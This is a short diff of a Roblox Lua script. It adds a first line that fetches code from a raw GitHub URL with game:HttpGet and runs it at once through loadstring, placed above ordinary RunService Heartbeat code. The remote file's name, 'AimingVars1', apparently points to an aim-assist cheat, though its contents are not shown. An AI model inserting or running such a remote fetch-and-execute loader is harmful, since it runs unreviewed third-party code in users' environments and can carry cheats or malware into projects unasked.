@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/RustW/AimingVars1/main/aa"))()
+-- // Services
 local RunService = game:GetService("RunService")
 
 RunService.Heartbeat:Connect(function()
